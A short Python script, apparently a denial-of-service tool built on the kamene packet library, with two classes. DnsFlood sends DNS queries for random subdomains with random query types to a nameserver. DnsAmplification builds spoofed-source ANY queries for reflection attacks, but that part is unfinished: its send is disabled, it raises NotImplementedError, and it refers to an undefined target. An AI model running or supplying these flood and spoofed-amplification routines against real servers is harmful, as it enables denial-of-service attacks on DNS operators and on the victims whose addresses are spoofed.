#!/usr/bin/env python3
try:
    import sys
    import random
    import string
    sys.dont_write_bytecode = True
    from kamene.all import *
except ImportError as err:
    print("ImportError: {0}".format(err))
    exit(1)
    # raise err

DNS_QUERY_TYPES = ["ANY", "A","AAAA","CNAME","MX","NS","PTR","CERT","SRV","TXT", "SOA"] # DNS Query Types

class DnsFlood():
    def __init__(self, nameserver='127.0.0.1', query_name='isc.org', query_type=None):
        self.nameserver = nameserver
        self.query_name = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(17)) + '.' + query_name
        self.query_type = query_type if query_type else random.choice(DNS_QUERY_TYPES) 

    def execute(self):
        try:
            ip = IP(dst=self.nameserver)
            udp = UDP(dport=53)
            dns = DNS(rd=1, qdcount=1, qd=DNSQR(qname=self.query_name, qtype=self.query_type))
            # print("{0} / {1} / {2}".format(ip,udp,dns))
            request = (ip/udp/dns)
            # print("{}",request)
            send(request)
        except:
            print("Unexpected error on {0}: {1}".format(type(self).__name__,sys.exc_info()[0]))
            raise


class DnsAmplification():
    def __init__(self, nameserver='127.0.0.1', domain='isc.org', query_type=255):
        self.nameserver = nameserver
        self.domain = domain
        self.query_type = query_type

    def execute(self):
        try:
            ip = IP(src=self.target, dst=self.nameserver)
            udp = UDP(dport=53)
            # dns = DNS(rd=1, qdcount=1, qd=DNSQR(qname="isc.org", qtype=255))
            dns = DNS(rd=1, qdcount=1, qd=DNSQR(qname=self.domain, qtype=self.query_type))
            # print("{0} / {1} / {2}".format(ip,udp,dns))
            request = (ip/udp/dns)
            # print("{}",request)
            # send(request)
            raise NotImplementedError
        except:
            print("Unexpected error on {0}: {1}".format(
                type(self).__name__, sys.exc_info()[0]))
            raise
